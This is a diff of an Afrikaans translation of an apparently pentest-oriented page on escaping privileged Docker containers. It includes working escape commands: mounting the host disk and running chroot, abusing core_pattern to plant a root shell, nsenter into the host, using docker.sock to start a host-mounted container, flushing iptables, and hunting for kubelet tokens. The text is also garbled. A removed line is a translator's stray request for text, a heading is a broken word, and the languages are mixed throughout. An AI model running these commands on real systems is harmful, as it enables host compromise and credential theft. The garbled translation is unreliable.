@@ -4,35 +4,35 @@
 
 ## Oorsig
 
-'n Kontener wat met `--privileged` begin is nie dieselfde as 'n normale kontener met een of twee ekstra permissies nie. In praktyk verwyder of verswak `--privileged` verskeie van die standaard runtime-beskermings wat gewoonlik die werkbelasting van gevaarlike hostbronne weghou. Die presiese effek hang steeds af van die runtime en host, maar vir Docker is die algemene resultaat:
+'n container wat met `--privileged` begin is nie dieselfde as 'n normale container met een of twee ekstra permissies nie. In praktyk verwyder of verswak `--privileged` verskeie van die standaard runtime-beskermings wat gewoonlik die werkbelasting weg van gevaarlike gasheer-hulpbronne hou. Die presiese effek hang steeds af van die runtime en gasheer, maar vir Docker is die algemene resultaat:
 
-- alle capabilities word toegekend
+- alle capabilities word toegeken
 - die device cgroup-beperkings word opgehef
-- baie kernel filesystems hou op om read-only gemount te wees
+- baie kernel-lêerstelsels hou op om as slegs-lees gemonteer te wees
 - standaard gemaskerde procfs-paaie verdwyn
-- seccomp filtering is uitgeschakel
-- AppArmor-beperking is uitgeschakel
-- SELinux-isolasie is uitgeschakel of vervang met ’n baie breër etiket
+- seccomp-filtrering is gedeaktiveer
+- AppArmor-inperking is gedeaktiveer
+- SELinux-isolasie is gedeaktiveer of vervang met 'n veel breër etiket
 
-Die belangrike gevolg is dat ’n privileged container gewoonlik nie ’n subtiele kernel exploit benodig nie. In baie gevalle kan dit eenvoudig direk met host-toestelle, host-gefokusde kernel filesystems, of runtime-koppelvlakke interaksie hê en dan na ’n host-shell pivot.
+Die belangrike gevolg is dat 'n privileged container gewoonlik nie 'n subtiele kernel-exploit benodig nie. In baie gevalle kan dit eenvoudig met gasheer-toestelle, gasheer-gesigte kernel-lêerstelsels, of runtime-koppelvlakke direk kommunikeer en dan na 'n gasheer-shell draai.
 
 ## Wat `--privileged` Nie Outomaties Verander Nie
 
-`--privileged` sluit **nie** outomaties by die host PID-, network-, IPC- of UTS-namespaces aan nie. ’n privileged container kan steeds private namespaces hê. Dit beteken sommige ontsnappingskettings vereis ’n ekstra voorwaarde soos:
+`--privileged` sluit nie outomaties by die gasheer PID-, network-, IPC- of UTS-namespaces aan nie. 'n privileged container kan steeds privaat namespaces hê. Dit beteken sommige ontsnappingskettings vereis 'n ekstra voorwaarde soos:
 
-- a host bind mount
-- host PID sharing
+- 'n host bind mount
+- host PID-deling
 - host networking
-- visible host devices
-- writable proc/sys interfaces
+- sigbare host-toestelle
+- skryfbare proc/sys-interfaces
 
-Daardie voorwaardes is dikwels maklik om in werklike misconfigurasies te bevredig, maar hulle is konsepteel apart van `--privileged` self.
+Daardie voorwaardes is dikwels maklik om te bevredig in werklike verkeerde konfigurasies, maar hulle is konseptueel apart van `--privileged` self.
 
-## Ontsnappingspaaie
+## Ontsnappade
 
-### 1. Mount The Host Disk Through Exposed Devices
+### 1. Monteer die gasheer-disk deur blootgestelde toestelle
 
-’N privileged container sien gewoonlik baie meer device nodes onder `/dev`. As die host block device sigbaar is, is die eenvoudigste ontsnapping om dit te mount en met `chroot` in die host filesystem te gaan:
+'n privileged container sien gewoonlik baie meer device nodes onder `/dev`. As die gasheer block device sigbaar is, is die eenvoudigste ontsnapping om dit te mount en met `chroot` in die gasheer-lêerstelsel in te gaan:
 ```bash
 ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
 mkdir -p /mnt/hostdisk
@@ -40,22 +40,22 @@ mount /dev/sda1 /mnt/hostdisk 2>/dev/null || mount /dev/vda1 /mnt/hostdisk 2>/de
 ls -la /mnt/hostdisk
 chroot /mnt/hostdisk /bin/bash 2>/dev/null
 ```
-As die root partition nie duidelik is nie, enumereer eers die blokuitleg:
+As die root partition nie duidelik is nie, enumereer eers die block layout:
 ```bash
 fdisk -l 2>/dev/null
 blkid 2>/dev/null
 debugfs /dev/sda1 2>/dev/null
 ```
-As die praktiese pad is om 'n setuid helper in 'n skryfbare host mount te plant in plaas daarvan om te `chroot`, onthou dat nie elke lêerstelsel die setuid bit eer nie. 'n Vinnige host-kant vermoënskontrole is:
+As die praktiese pad is om 'n setuid helper in 'n skryfbare gasheer-mount te plant in plaas van om te `chroot`, onthou dat nie elke lêerstelsel die setuid-bit eerbiedig nie. 'n Vinnige gasheer-kant vermoëkontrole is:
 ```bash
 mount | grep -v "nosuid"
 ```
-Dit is nuttig omdat skryfbare paaie onder `nosuid` lêerstelsels baie minder interessant is vir die klassieke "drop a setuid shell and execute it later" werkvloeie.
+Dit is nuttig omdat skryfbare paaie onder `nosuid` filesisteme veel minder interessant is vir klassieke "drop a setuid shell and execute it later" werkvloei.
 
 Die verswakte beskermings wat hier misbruik word, is:
 
 - volledige toestelblootstelling
-- breë bevoegdhede, veral `CAP_SYS_ADMIN`
+- breë capabilities, veral `CAP_SYS_ADMIN`
 
 Related pages:
 
@@ -67,27 +67,27 @@ protections/capabilities.md
 protections/namespaces/mount-namespace.md
 {{#endref}}
 
-### 2. Monteren of hergebruik van host bind mount en `chroot`
+### 2. Monteer of hergebruik 'n host bind mount en `chroot`
 
-As die host root-lêerstelsel reeds binne die kontainer gemonteer is, of as die kontainer die nodige mounts kan skep omdat dit privileged is, is 'n host shell dikwels net een `chroot` ver:
+As die host root filesystem reeds binne die konteneur gemonteer is, of as die konteneur die nodige mounts kan skep omdat dit privileged is, is 'n host shell dikwels net een `chroot` weg:
 ```bash
 mount | grep -E ' /host| /mnt| /rootfs'
 ls -la /host 2>/dev/null
 chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
 ```
-As daar geen host root bind mount bestaan nie, maar host storage bereikbaar is, skep een:
+Indien daar geen host root bind mount bestaan nie, maar host storage bereikbaar is, skep een:
 ```bash
 mkdir -p /tmp/host
 mount --bind / /tmp/host
 chroot /tmp/host /bin/bash 2>/dev/null
 ```
-This path abuses:
+Hierdie pad misbruik:
 
 - verswakte mount-beperkings
 - volle capabilities
-- gebrek aan MAC-confinement
+- gebrek aan MAC-afbakening
 
-Related pages:
+Verwante bladsye:
 
 {{#ref}}
 protections/namespaces/mount-namespace.md
@@ -105,11 +105,11 @@ protections/apparmor.md
 protections/selinux.md
 {{#endref}}
 
-### 3. Misbruik skryfbare `/proc/sys` Of `/sys`
+### 3. Misbruik skryfbare `/proc/sys` of `/sys`
 
-Een van die groot gevolge van `--privileged` is dat procfs- en sysfs-beskermings baie swakker word. Dit kan host-facing kernel-interfaces blootstel wat normaalweg gemasker is of as read-only gemount is.
+Een van die groot gevolge van `--privileged` is dat procfs- en sysfs-beskermings baie swakker word. Dit kan host-gerigte kernel-koppelvlakke blootstel wat normaalweg gemaskeer of as read-only gemonteer is.
 
-'n Klassieke voorbeeld is `core_pattern`:
+’n klassieke voorbeeld is `core_pattern`:
 ```bash
 [ -w /proc/sys/kernel/core_pattern ] || exit 1
 overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
@@ -131,7 +131,7 @@ gcc /tmp/crash.c -o /tmp/crash
 /tmp/crash
 ls -l /tmp/rootsh
 ```
-Ander hoë-waarde-paaie sluit in:
+Ander paaie met hoë waarde sluit in:
 ```bash
 cat /proc/sys/kernel/modprobe 2>/dev/null
 cat /proc/sys/fs/binfmt_misc/status 2>/dev/null
@@ -140,8 +140,8 @@ find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
 ```
 Hierdie pad misbruik:
 
-- ontbrekende gemaskeerde paaie
-- ontbrekende slegs-lees stelselpaaie
+- ontbrekende gemaskerde paaie
+- ontbrekende stelselpaaie wat net-lees is
 
 Related pages:
 
@@ -155,9 +155,9 @@ protections/read-only-paths.md
 
 ### 4. Gebruik volle capabilities vir mount- of namespace-gebaseerde ontsnapping
 
-'n Geprivilegieerde container kry die capabilities wat normaalweg van standaardcontainers verwyder word, insluitend `CAP_SYS_ADMIN`, `CAP_SYS_PTRACE`, `CAP_SYS_MODULE`, `CAP_NET_ADMIN`, en baie ander. Dit is dikwels genoeg om 'n plaaslike voet aan die grond in 'n host-ontsnapping te verander sodra 'n ander blootgestelde oppervlak bestaan.
+'n bevoorregte container kry die capabilities wat normaalweg uit standaard-containers verwyder word, insluitend `CAP_SYS_ADMIN`, `CAP_SYS_PTRACE`, `CAP_SYS_MODULE`, `CAP_NET_ADMIN`, en baie ander. Dit is dikwels genoeg om 'n plaaslike voetjie in 'n host-ontsnapping te omskep sodra 'n ander blootgestelde oppervlak bestaan.
 
-'n Eenvoudige voorbeeld is om bykomende lêerstelsels te mount en namespace-toegang te gebruik:
+'n eenvoudige voorbeeld is om bykomende lêerstelsels te mount en namespace entry te gebruik:
 ```bash
 capsh --print | grep cap_sys_admin
 which nsenter
@@ -170,8 +170,8 @@ nsenter -t 1 -m -u -n -i -p /bin/bash
 ```
 Hierdie pad misbruik:
 
-- die standaard privileged capability-stel
-- opsionele host PID-deling
+- die verstek privileged capability set
+- opsionele host PID sharing
 
 Verwante bladsye:
 
@@ -183,21 +183,21 @@ protections/capabilities.md
 protections/namespaces/pid-namespace.md
 {{#endref}}
 
-### 5. Ontsnap via runtime-sokette
+### 5. Escape Through Runtime Sockets
 
-’n privileged container eindig dikwels met host runtime-state of sockets sigbaar. As ’n Docker-, containerd- of CRI-O-socket bereikbaar is, is die eenvoudigste benadering dikwels om die runtime API te gebruik om ’n tweede container met host-toegang te begin:
+'n privileged container beland dikwels met host runtime state of sockets wat sigbaar is. As 'n Docker-, containerd- of CRI-O-socket bereikbaar is, is die eenvoudigste benadering dikwels om die runtime API te gebruik om 'n tweede container met host access te loods:
 ```bash
 find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \) 2>/dev/null
 docker -H unix:///var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
 ```
-Ek het die teks nodig wat jy wil hê ek moet vertaal. Plak asseblief die gedeelte van die lêer wat begin met "For containerd:".
+Vir containerd:
 ```bash
 ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
 ```
 Hierdie pad misbruik:
 
 - privileged runtime exposure
-- host bind mounts wat deur die runtime self geskep is
+- host bind mounts created through the runtime itself
 
 Related pages:
 
@@ -211,7 +211,7 @@ runtime-api-and-daemon-exposure.md
 
 ### 6. Verwyder newe-effekte van netwerkisolering
 
-`--privileged` sluit nie op sigself by die host network namespace aan nie, maar as die container ook `--network=host` of ander toegang tot die host-netwerk het, word die volledige netwerkstapel veranderbaar:
+`--privileged` sluit op sigself nie by die host network namespace aan nie, maar as die container ook `--network=host` of ander host-network toegang het, raak die volledige network stack veranderbaar:
 ```bash
 capsh --print | grep cap_net_admin
 ip addr
@@ -220,9 +220,9 @@ iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
 ip link set lo down 2>/dev/null
 iptables -F 2>/dev/null
 ```
-Dit is nie altyd 'n direkte host-shell nie, maar dit kan lei tot denial of service, traffic interception, of toegang tot loopback-only management services.
+Dit is nie altyd 'n direkte host-shell nie, maar dit kan lei tot denial of service, verkeersafluistering, of toegang tot slegs-loopback bestuursdienste.
 
-Verwante bladsye:
+Related pages:
 
 {{#ref}}
 protections/capabilities.md
@@ -232,17 +232,17 @@ protections/capabilities.md
 protections/namespaces/network-namespace.md
 {{#endref}}
 
-### 7. Lees gasheer-sekrete en uitvoeringstoestand
+### 7. Lees Host-sekrete en runtime-toestand
 
-Selfs wanneer 'n skoon shell-ontsnapping nie onmiddellik beskikbaar is nie, het geprivilegieerde containers dikwels genoeg toegang om gasheer-sekrete, kubelet-staat, runtime-metadata en naburige container-lêerstelsels te lees:
+Selfs wanneer 'n skoon shell-escape nie onmiddellik beskikbaar is nie, het privileged containers dikwels genoeg toegang om host-sekrete, kubelet state, runtime metadata, en naburige container filesystems te lees:
 ```bash
 find /var/lib /run /var/run -maxdepth 3 -type f 2>/dev/null | head -n 100
 find /var/lib/kubelet -type f -name token 2>/dev/null | head -n 20
 find /var/lib/containerd -type f 2>/dev/null | head -n 50
 ```
-As `/var` op die host gemount is of die runtime directories sigbaar is, kan dit genoeg wees vir lateral movement of cloud/Kubernetes credential theft selfs voordat 'n host shell verkry is.
+As `/var` host-mounted is of die runtime directories sigbaar is, kan dit genoeg wees vir lateral movement of cloud/Kubernetes credential theft selfs voordat 'n host shell verkry is.
 
-Verwante bladsye:
+Related pages:
 
 {{#ref}}
 protections/namespaces/mount-namespace.md
@@ -252,7 +252,7 @@ protections/namespaces/mount-namespace.md
 sensitive-host-mounts.md
 {{#endref}}
 
-## Checks
+## Kontroles
 
 Die doel van die volgende opdragte is om te bevestig watter privileged-container escape families onmiddellik lewensvatbaar is.
 ```bash
@@ -265,15 +265,15 @@ find / -maxdepth 3 -name '*.sock' 2>/dev/null    # Look for runtime sockets
 ```
 Wat hier interessant is:
 
-- ’n volledige capability-stel, veral `CAP_SYS_ADMIN`
+- 'n volledige capability set, veral `CAP_SYS_ADMIN`
 - skryfbare proc/sys-blootstelling
-- sigbare host devices
-- ontbrekende seccomp- en MAC-beperking
+- sigbare host-toestelle
+- ontbrekende seccomp- en MAC-confinement
 - runtime sockets of host root bind mounts
 
-Enigeen van hierdie kan genoeg wees vir post-exploitation. Meerdere tesame beteken gewoonlik dat die container funksioneel een of twee opdragte van ’n host-kompromittering af is.
+Enigeen van dié kan genoeg wees vir post-exploitation. Verskeie saam beteken gewoonlik dat die container funksioneel een of twee commands van host compromise af is.
 
-## Related Pages
+## Verwante bladsye
 
 {{#ref}}
 protections/capabilities.md
